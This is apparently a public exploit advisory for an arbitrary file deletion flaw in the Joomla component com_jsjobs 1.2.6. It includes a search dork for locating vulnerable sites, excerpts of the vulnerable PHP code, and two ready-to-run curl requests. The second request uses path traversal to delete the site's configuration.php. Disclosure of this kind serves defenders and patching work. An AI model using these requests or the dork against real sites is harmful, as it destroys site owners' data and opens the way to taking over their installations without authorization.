@@ -1,0 +1,99 @@
+# Exploit Title: Joomla! component com_jsjobs 1.2.6 - Arbitrary File Deletion
+# Dork: inurl:"index.php?option=com_jsjobs"
+# Date: 2019-08-16
+# Exploit Author: qw3rTyTy
+# Vendor Homepage: https://www.joomsky.com/
+# Software Link: https://www.joomsky.com/5/download/1
+# Version: 1.2.6
+# Tested on: Debian/nginx/joomla 3.9.0
+
+# Vulnerability details:
+# This vulnerability is caused when processing custom userfield.
+
+File:		site/models/job.php
+Function:	storeJob
+Line:		1240
+-------------------------------------
+
+  1215	    //custom field code start
+  1216	        $customflagforadd = false;
+  1217	        $customflagfordelete = false;
+  1218	        $custom_field_namesforadd = array();
+  1219	        $custom_field_namesfordelete = array();
+  1220	        $userfield = $this->getJSModel('customfields')->getUserfieldsfor(2);
+  1221	        $params = array();
+  1222	        $forfordelete = '';
+  1223	        
+  1224	        foreach ($userfield AS $ufobj) {
+  1225	            $vardata = '';
+  1226	            if($ufobj->userfieldtype == 'file'){
+  1227	                if(isset($data[$ufobj->field.'_1']) && $data[$ufobj->field.'_1'] == 0){
+  1228	                    $vardata = $data[$ufobj->field.'_2'];
+  1229	                }else{
+  1230	                    $vardata = $_FILES[$ufobj->field]['name'];
+  1231	                }
+  1232	                $customflagforadd=true;
+  1233	                $custom_field_namesforadd[]=$ufobj->field;
+  1234	            }else{
+  1235	                $vardata = isset($data[$ufobj->field]) ? $data[$ufobj->field] : '';
+  1236	            }
+  1237	            if(isset($data[$ufobj->field.'_1']) && $data[$ufobj->field.'_1'] == 1){
+  1238	                $customflagfordelete = true;
+  1239	                $forfordelete = $ufobj->field;
+  1240	                $custom_field_namesfordelete[]= $data[$ufobj->field.'_2'];		//No check.
+  1241	            }
+  ...snip...
+  1323	        // new
+  1324	        //removing custom field 
+  1325	        if($customflagfordelete == true){
+  1326	            foreach ($custom_field_namesfordelete as $key) {
+  1327	                $res = $this->getJSModel('common')->uploadOrDeleteFileCustom($row->id,$key ,1,2);		//!!!
+  1328	            }
+  1329	        }
+
+File:		site/models/common.php
+Function:	uploadOrDeleteFileCustom
+Line:		851
+-------------------------------------
+
+   748	        $path = $base . '/' . $datadirectory;
+   749	        if (!file_exists($path)) { // create user directory
+   750	            $this->makeDir($path);
+   751	        }
+   752	        $isupload = false;
+   753	        $path = $path . '/data';
+   754	        if (!file_exists($path)) { // create user directory
+   755	            $this->makeDir($path);
+   756	        }
+   757	        if($for == 3 )
+   758	            $path = $path . '/jobseeker';
+   759	        else
+   760	            $path = $path . '/employer';
+   761	
+   762	        if (!file_exists($path)) { // create user directory
+   763	            $this->makeDir($path);
+   764	        }
+   ...snip...
+   843	        } else { // DELETE FILES
+   844	            if ($isdeletefile == 1) {
+   845	                if($for == 3){
+   846	                    $userpath = $path . '/'.$datafor.'_' . $resumeid . '/customfiles/';
+   847	                }else{
+   848	                    $userpath = $path . '/'.$datafor.'_' . $id . '/customfiles/';
+   849	                }
+   850	                $file = $userpath.$field;
+   851	                unlink($file);		//!!!
+   852	            }
+   853	            return 1;
+   854	        }
+   855	    }
+
+#####################################
+#PoC:
+#####################################
+
+# If an administrator has added custom userfield 'ufield926' as field type 'file', attacker are can trigger this vulnerability by send a following requests.
+
+$> curl -X POST -i -H 'Cookie: VALID_SESSION_ID=VALID_SESSION_ID' -F 'options=com_jsjobs' -F 'task=job.savejob' -F 'id=' -F 'enforcestoppublishjob=666' -F 'startpublishing=2019-08-16' -F 'stoppublishing=2019-08-16' -F 'description=woot' -F 'title=woot' -F 'ufield926=@./valid_image.jpg' -F 'VALID_FORM_TOKEN_FROM_FORMJOB=1' "http://localhost/index.php"
+
+$> curl -X POST -i -H 'Cookie: VALID_SESSION_ID=VALID_SESSION_ID' -F 'options=com_jsjobs' -F 'task=job.savejob' -F 'id=666' -F 'enforcestoppublishjob=666' -F 'startpublishing=2019-08-16' -F 'stoppublishing=2019-08-16' -F 'description=woot' -F 'title=woot' -F 'ufield926_1=1' -F 'ufield926_2=../../../../../configuration.php' -F 'VALID_FORM_TOKEN_FROM_FORMJOB=1' "http://localhost/index.php"
